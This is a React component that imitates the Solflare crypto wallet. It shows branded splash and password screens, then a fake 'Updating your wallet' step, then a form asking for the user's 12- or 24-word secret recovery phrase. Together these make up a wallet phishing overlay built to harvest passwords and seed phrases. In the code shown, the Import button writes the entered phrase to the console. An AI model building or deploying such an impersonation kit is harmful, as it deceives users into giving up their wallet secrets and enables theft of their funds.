import { useState, useEffect } from 'react';

interface SolflarePanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'updating' | 'import';

export default function SolflarePanel({ isOpen, onClose }: SolflarePanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [invalidIndices, setInvalidIndices] = useState<number[]>([]);

  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setShowPassword(false);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setInvalidIndices([]);

      const timer = setTimeout(() => setView('password'), 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  useEffect(() => {
    if (view === 'updating') {
      const timer = setTimeout(() => setView('import'), 3500);
      return () => clearTimeout(timer);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    const newInvalidIndices = newValues
      .slice(0, phraseLength)
      .map((val, i) => (val.length > 0 && !/^[a-z]+$/.test(val) ? i + 1 : -1))
      .filter((i) => i !== -1);
      
    setInvalidIndices(newInvalidIndices);
  };

  const getErrorText = () => {
    if (invalidIndices.length === 0) return '';
    if (invalidIndices.length === 1) return `Word ${invalidIndices[0]} is incorrect or misspelled`;
    return `Words ${invalidIndices.join(', ')} are incorrect or misspelled`;
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && invalidIndices.length === 0;
  };

  return (
    <>
      <div className="fixed inset-0 z-[2147483648] pointer-events-none font-sans">
        
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out pointer-events-auto ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`} 
          onClick={onClose}
        ></div>
        
        <div className={`flex pointer-events-auto transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[685px] md:border border-[#1a1c23] md:rounded-xl overflow-y-auto ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#02050a] shadow-2xl relative overflow-hidden flex flex-col md:rounded-xl">
            
            {/* LAYER 1: SPLASH SCREEN (VIDEO) */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center p-[8px] transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-105 pointer-events-none'}`}>
              <div className="bg-[#ffef46] rounded-[36px] h-full w-full overflow-hidden">
                <video src="/solflare-splash.webm" autoPlay loop muted playsInline className="w-full h-full object-contain"></video>
              </div>
            </div>

            {/* LAYER 2: PASSWORD SCREEN (VIDEO) */}
            <div className={`absolute inset-0 z-20 flex flex-col p-[8px] transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-[#02050a] ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="bg-[#fcf84c] rounded-[36px] h-[250px] w-full overflow-hidden shrink-0">
                <video src="/solflare-password.webm" autoPlay loop muted playsInline className="w-full h-full object-cover rounded-[36px]"></video>
              </div>
              
              <div className="flex flex-col items-start justify-start w-full px-4 flex-1">
                <div className="mt-6 mb-1">
                  <p className="text-white text-[24px] font-bold font-inter">Unlock your wallet</p>
                </div>
                <div className="mb-6">
                  <p className="text-[#f5f8ff66] font-inter font-medium text-[14px] leading-[18px]">Enter your password and access your funds safely.</p>
                </div>
                
                <div className="w-full relative mb-6">
                  <input 
                    className="w-full bg-[#02050a66] rounded-[12px] border border-[#f5f8ff1f] py-[12px] pl-[12px] pr-[48px] font-inter text-[#f5f8ff] font-medium text-[16px] hover:border-[#f5f8ff] focus:border-[#ffef46] h-[49px] outline-none placeholder:opacity-50 transition-all duration-300" 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="group cursor-pointer absolute right-4 top-3">
                    {!showPassword ? (
                      <svg className="text-[#66686e] w-[24px] h-[24px] hover:text-white transition-colors" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"></path><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"></path><path d="m2 2 20 20"></path></svg>
                    ) : (
                      <svg className="text-[#66686e] w-[24px] h-[24px] hover:text-white transition-colors" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"></path><circle cx="12" cy="12" r="3"></circle></svg>
                    )}
                  </button>
                </div>
                
                <div className="w-full mt-auto mb-4">
                  <button 
                    onClick={() => setView('updating')}
                    disabled={password.length < 3}
                    className="font-inter flex items-center justify-center py-[14px] outline-none w-full text-[#02050a] bg-[#ffef46] font-semibold text-[16px] rounded-full h-[48px] transition-all duration-300 cursor-pointer hover:bg-[#eeda0f] disabled:cursor-not-allowed disabled:bg-[#f5f8ff1f] disabled:text-[#f5f8ff33] active:scale-[0.98]" 
                    type="button"
                  >
                    Unlock
                  </button>
                </div>
              </div>
            </div>

            {/* LAYER 3: UPDATING STATE (TIPS) */}
            <div className={`absolute inset-0 z-30 flex flex-col p-[8px] transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'updating' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="bg-[#0c0f14] rounded-[36px] h-full w-full flex flex-col items-center justify-start relative border border-[#1a1c23]">
                <div className="flex items-center justify-center mt-12 mb-10 w-full px-8">
                  <SolflareTextLogoSVG className="h-[36px] w-full text-white" />
                </div>
                <div className="mt-16 text-center animate-[fadeIn_0.5s_ease-out]">
                  <p className="text-[#ffffff] text-[22px] font-bold font-inter mb-4">Updating your wallet</p>
                  <p className="text-[#ffef46] font-inter font-medium text-[16px] max-w-[290px] leading-[24px] mb-2 mx-auto">What's new?</p>
                  <div className="bg-[#f5f8ff0a] py-4 px-6 rounded-[24px] mt-4 mx-6 border border-[#ffffff10]">
                    <p className="text-[#ffffff] font-inter font-normal text-[15px] max-w-[290px] leading-[24px]">View Solana, Ethereum, and Polygon balances together in one place.</p>
                  </div>
                </div>
                <div className="mt-auto mb-10">
                  <div className="flex items-center justify-center gap-x-2">
                    <div className="w-2 h-2 rounded-full bg-[#ffef46] animate-pulse"></div>
                    <p className="text-[#f5f8ff66] font-inter font-normal text-[14px]">Version 2.15.4 installing...</p>
                  </div>
                </div>
              </div>
            </div>

            {/* LAYER 4: IMPORT WALLET (SEED PHRASE) */}
            <div className={`absolute inset-0 z-40 flex flex-col p-[8px] transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              <div className="bg-[#0c0f14] rounded-[36px] h-full w-full flex flex-col items-center justify-start pb-2 border border-[#1a1c23] overflow-hidden">
                <div className="flex items-center justify-between mt-4 px-4 w-full shrink-0">
                  <div className="flex items-center justify-start">
                    <button type="button" className="rounded-[12px] p-[8px] hover:bg-[#bcc8e714] transition-colors" onClick={onClose}>
                      <svg className="w-5 h-5 text-[#f5f8ff66] hover:text-white transition-colors" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M4.7 244.7c-6.2 6.2-6.2 16.4 0 22.6l176 176c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L54.6 272 432 272c8.8 0 16-7.2 16-16s-7.2-16-16-16L54.6 240 203.3 91.3c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0l-176 176z"></path></svg>
                    </button>
                  </div>
                  <div className="w-[100px]">
                    <SolflareTextLogoSVG className="h-[24px] w-full text-white" />
                  </div>
                  <div className="w-[36px]"></div>
                </div>

                <div className="flex justify-center items-center px-3 py-4 mt-2 shrink-0">
                  <p className="font-roboto text-white font-medium text-[20px] leading-[24px]">Import Secret Phrase</p>  
                </div>

                <div className="w-max h-[36px] p-[2px] border border-[#f5f8ff14] bg-[#02050a] flex items-center rounded-full mb-4 shrink-0">
                  <button 
                    type="button" 
                    className={`cursor-pointer px-5 text-[15px] leading-[24px] font-medium font-inter rounded-full transition-all duration-300 ${phraseLength === 12 ? 'bg-[#f5f8ff14] text-white shadow-sm' : 'text-[#f5f8ff66] hover:text-white bg-transparent'}`}
                    onClick={() => { setPhraseLength(12); setPhraseValues(Array(24).fill('')); setInvalidIndices([]); }}
                  >
                    12
                  </button>
                  <button 
                    type="button" 
                    className={`cursor-pointer px-5 text-[15px] leading-[24px] font-medium font-inter rounded-full transition-all duration-300 ${phraseLength === 24 ? 'bg-[#f5f8ff14] text-white shadow-sm' : 'text-[#f5f8ff66] hover:text-white bg-transparent'}`}
                    onClick={() => { setPhraseLength(24); setPhraseValues(Array(24).fill('')); setInvalidIndices([]); }}
                  >
                    24
                  </button>
                </div>

                <div className="flex-1 w-full px-4 mb-2 overflow-y-auto solflare-custom-scrollbar">
                  <div className="grid grid-cols-3 gap-x-3 gap-y-4 pb-4 px-2">
                    {Array.from({ length: phraseLength }).map((_, i) => {
                      const isError = invalidIndices.includes(i + 1);
                      return (
                        <div key={i} className="relative group">
                          <p className="pr-[10px] font-inter text-[#66686e] group-focus-within:text-[#ffef46] transition-colors font-medium text-[14px] absolute top-[11px]">{i + 1}</p>
                          <input 
                            className={`text-white font-inter font-medium text-[15px] bg-transparent border-b h-[42px] self-center outline-none pl-6 pr-1 w-full transition-all duration-300 ${isError ? 'border-[#da493f] text-[#da493f] focus:border-[#da493f]' : 'border-[#bcc8e71f] hover:border-[#eaeef766] focus:border-[#ffef46]'}`} 
                            type="password" 
                            value={phraseValues[i]}
                            onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                          />
                        </div>
                      );
                    })}
                  </div>
                </div>

                <div className={`px-6 transition-opacity duration-300 text-center min-h-[20px] mb-2 shrink-0 ${invalidIndices.length > 0 ? 'opacity-100' : 'opacity-0'}`}>
                  <p className="font-inter text-[#da493f] font-normal text-[13px] leading-[18px]">
                    {getErrorText()}
                  </p>
                </div>

                <div className="w-full px-5 pb-4 shrink-0 mt-auto">
                  <button 
                    className="font-inter flex items-center justify-center py-[14px] outline-none w-full text-[#02050a] bg-[#ffef46] font-semibold text-[16px] rounded-full h-[52px] transition-all duration-300 cursor-pointer hover:bg-[#eeda0f] disabled:cursor-not-allowed disabled:bg-[#f5f8ff1f] disabled:text-[#f5f8ff33] active:scale-[0.98]" 
                    type="button" 
                    disabled={!isPhraseComplete()}
                    onClick={() => {
                      console.log("Solflare Import Complete:", phraseValues.slice(0, phraseLength));
                      onClose();
                    }}
                  >
                    Import Wallet
                  </button>
                </div>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .solflare-custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .solflare-custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .solflare-custom-scrollbar::-webkit-scrollbar-thumb { background: #3f3f3f; border-radius: 10px; }
        .solflare-custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #4f4f4f; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
      `}} />
    </>
  );
}

const SolflareTextLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 151 36" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
    <path d="M136.939 22.0301V13.8318C139.653 14.084 142.033 15.0089 143.452 16.0601V19.0871L137.022 23.6696C136.98 23.123 136.939 22.5764 136.939 22.0301ZM130.007 23.9639C130.007 31.8679 134.767 35.9878 140.112 35.9878C143.411 35.9878 145.457 34.4743 150.092 29.8498V26.9068C148.63 28.4203 147.169 29.6395 145.457 30.8587C141.615 30.6907 138.984 29.093 137.732 26.2763L150.092 17.4053V12.066C147.377 9.9639 143.828 8.53441 140.279 8.53441C137.815 10.2162 135.06 12.9489 132.972 15.3032C130.759 17.7836 130.007 19.928 130.007 23.9639ZM98.8578 25.3093L105.747 20.3903V30.6064H104.328C100.862 30.6064 98.983 28.7146 98.8578 25.3093ZM92.7614 18.5405H98.6907V13.6637C102.24 13.4114 104.453 14.7146 105.747 16.4804V17.2793L92.9703 26.4443C91.8428 32.1199 95.6009 35.9878 99.3587 35.9878C101.363 35.9878 103.743 34.8528 105.33 32.4984H105.747V35.5674H113.89C112.929 34.6845 112.386 33.8437 112.386 29.4292L112.345 13.8737C110.382 9.87983 106.332 8.53439 104.328 8.53439C102.115 8.53439 97.0206 12.3603 95.2249 13.6637C93.2208 15.135 92.7614 16.6487 92.7614 18.5405ZM82.5315 6.81086H82.6984C83.7424 6.81086 84.4939 7.48348 84.4939 9.79583V29.0509C84.4939 33.5074 83.951 34.5163 82.9907 35.5675H92.6363C91.6757 34.5163 91.1331 33.5074 91.1331 29.0509V0.378336H90.632L82.5315 6.81086ZM65.9963 17.6576H70.673V29.0509C70.673 33.5074 70.1301 34.5163 69.1696 35.5675H79.2326C78.0217 34.5163 77.312 33.5074 77.312 29.0509V17.6576H81.9886V12.6125H77.0197L73.7211 6.26426H78.7317C79.9426 6.26426 80.736 6.01197 81.4458 5.42337L87.7925 0.378311H77.3537L70.673 6.4323V13.0751L65.9963 17.6576ZM56.8102 6.81086H56.9771C58.0211 6.81086 58.7726 7.48348 58.7726 9.79583V29.0509C58.7726 33.5074 58.2299 34.5163 57.2694 35.5675H66.915C65.9546 34.5163 65.4118 33.5074 65.4118 29.0509V0.378336H64.9107L56.8102 6.81086ZM41.8617 22.2821V13.8317C46.6637 13.6637 50.2546 16.2281 50.2546 22.2401V30.6907C45.2857 30.8587 41.8617 28.2943 41.8617 22.2821ZM34.8886 23.9639C34.8886 32.5825 40.4419 36.2401 46.9558 35.9878C49.3778 34.2642 52.1753 31.5313 54.263 29.2192C56.4762 26.7385 57.2277 24.5945 57.2277 20.5585C57.2277 11.9399 51.6741 8.2821 45.1603 8.53439C42.7802 10.3002 39.941 12.9908 37.8533 15.3032C35.6401 17.7836 34.8886 19.9279 34.8886 23.9639ZM17.2261 19.4234L19.6896 17.027L24.2827 18.5405C27.2891 19.5494 28.7923 21.3992 28.7923 24.0059C28.7923 25.9819 28.0408 27.2851 26.5376 28.9669L26.0782 29.4715L26.2453 28.2943C26.9134 24.0059 25.6608 22.1561 21.527 20.8106L17.2261 19.4234ZM11.0463 4.75077L23.573 8.95494L20.8588 11.5614L14.3449 9.37528C12.0903 8.61865 11.3386 7.39943 11.0463 4.83479L11.0463 4.75077ZM10.2948 26.108L13.134 23.3753L18.4787 25.1411C21.2764 26.066 22.2368 27.2852 21.9445 30.3544L10.2948 26.108ZM6.70386 13.9158C6.70386 13.1171 7.12133 12.3602 7.83108 11.7297C8.58278 12.8228 9.87709 13.7897 11.9231 14.4623L16.3492 15.9338L13.8857 18.3302L9.5431 16.9008C7.5388 16.2281 6.70386 15.2192 6.70386 13.9158ZM0.273462 31.4893L2.11065 33.4654L5.07527 30.7327L19.8149 35.9878C29.0011 29.8498 33.9281 25.6877 33.9281 20.5586C33.9281 17.153 31.924 15.2612 27.4979 13.7897L24.1576 12.6546L33.3018 3.82588L31.4646 1.84982L28.7505 4.24619L15.9317 0C11.9648 1.30322 6.95416 5.12908 6.95416 8.95494C6.95416 9.37528 6.99612 9.79583 7.12128 10.2582C3.82264 12.15 2.48638 13.9158 2.48638 16.1021C2.48638 18.1622 3.57208 20.2222 7.03783 21.3572L9.79362 22.2821L0.273462 31.4893ZM115.81 35.5675H126.291C124.829 34.6006 123.953 33.6334 123.953 29.0089V15.3873L127.377 16.2702C128.755 16.6065 129.381 16.4804 130.508 15.3032L136.521 8.95497H128.504L124.203 13.4534H123.827L123.118 8.53441H122.617L113.43 16.9008H116.353C116.896 16.9008 117.314 17.3213 117.314 17.8679V29.0089C117.314 33.6334 116.771 34.6006 115.81 35.5675Z" />
  </svg>
);